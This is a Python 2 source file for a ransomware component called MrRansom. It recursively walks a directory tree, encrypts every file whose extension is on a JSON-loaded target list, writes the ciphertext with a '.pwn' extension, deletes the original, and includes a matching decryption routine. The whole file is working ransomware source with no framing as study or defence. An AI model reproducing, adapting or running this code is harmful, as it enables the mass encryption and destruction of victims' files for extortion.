import json
import os
import time

from file_util import read_chunks, get_file
from aldersonalgorithm import AldersonAlgorithm

DECRYPT = 'decrypt'

ENCRYPT = 'encrypt'

FILE_TYPES_JSON = "data/file_types.json"

ENCRYPTED_EXTENSION = ".pwn"


def get_file_types_to_encrypt():
    types_json = json.loads(get_file(os.path.join(os.path.dirname(os.path.realpath(__file__)), FILE_TYPES_JSON)))

    return [file_type for file_type in types_json["fileTypes"]]


FILE_TYPES_TO_ENCRYPT = get_file_types_to_encrypt()


def get_target_files(files, mode):
    files_to_process = []
    for file_path in files:
        if should_process(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_process(file_path, mode):
    return mode == ENCRYPT and can_encrypt_file(file_path) \
        or mode == DECRYPT and can_decrypt_file(file_path)


def can_encrypt_file(filename):
    for file_type in FILE_TYPES_TO_ENCRYPT:
        if filename.endswith(file_type) and not os.path.basename(filename).startswith("."):
            return True


def can_decrypt_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


class MrRansom:

    def __init__(self, key, root_dir):
        self.key = key
        self.algorithm = AldersonAlgorithm(key)
        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
                          os.walk(root_dir) for file_name in file_names]

    def encrypt(self):
        for file_path in get_target_files(self.all_files, ENCRYPT):
            self.encrypt_file(file_path)

    def decrypt(self):
        for file_path in get_target_files(self.all_files, DECRYPT):
            self.decrypt_file(file_path)

    def encrypt_file(self, in_file):
        start_time = time.time()

        out_file = in_file + ENCRYPTED_EXTENSION
        self.process(in_file, out_file, self.algorithm.encrypt_chunk)

        print "Encrypted '{}' in {}s".format(os.path.basename(in_file), time.time() - start_time)

    def decrypt_file(self, in_file):
        start_time = time.time()

        out_file = in_file[:len(in_file) - len(ENCRYPTED_EXTENSION)]
        self.process(in_file, out_file, self.algorithm.decrypt_chunk)

        print "Decrypted '{}' in {}s".format(os.path.basename(out_file), time.time() - start_time)

    @staticmethod
    def process(in_file, out_file, process):
        in_file_stream = open(in_file, "rb")
        out_file_stream = open(out_file, "w")

        for chunk in read_chunks(in_file_stream):
            out_file_stream.write(process(chunk))

        in_file_stream.close()
        out_file_stream.close()

        os.remove(in_file)

